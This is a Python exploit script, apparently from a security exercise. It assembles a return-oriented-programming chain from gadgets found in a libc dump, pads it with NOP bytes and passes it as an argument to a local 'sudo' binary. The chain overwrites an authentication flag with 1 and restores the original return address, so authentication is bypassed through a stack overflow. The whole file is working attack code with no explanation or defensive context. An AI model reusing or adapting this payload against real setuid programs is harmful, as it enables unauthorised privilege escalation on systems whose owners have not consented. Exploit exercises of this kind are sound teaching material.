import os, sys

import addresses
import assemble
from search import GadgetSearch
import struct

PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'

def get_arg():
	search = GadgetSearch(LIBC_DUMP_PATH)

	#attemping to mov dword ptr [edx], eax <--> mov dword ptr[address_of_auth], 1 

	put_1_in_eax = struct.pack( "<I", int(search.find_format("xor eax, eax")[1],16) ) + struct.pack( "<I", int(search.find_format("inc eax")[1],16) ) 

	put_address_of_auth_in_edx = struct.pack( "<I", int(search.find_format("pop edx")[1],16) ) + struct.pack("<I", addresses.AUTH) 

	change_auth_value = struct.pack("<I", int(search.find_format("mov dword ptr [edx], eax ")[1], 16 ))

	start_littile_endian = put_1_in_eax + put_address_of_auth_in_edx + change_auth_value

	ra_littile_endian = struct.pack("<I", addresses.ORIGINAL_RA)


	ret = "\x90" * 66 + start_littile_endian + ra_littile_endian
	return ret 





def main(argv):
	os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())

if __name__ == '__main__':
	main(sys.argv)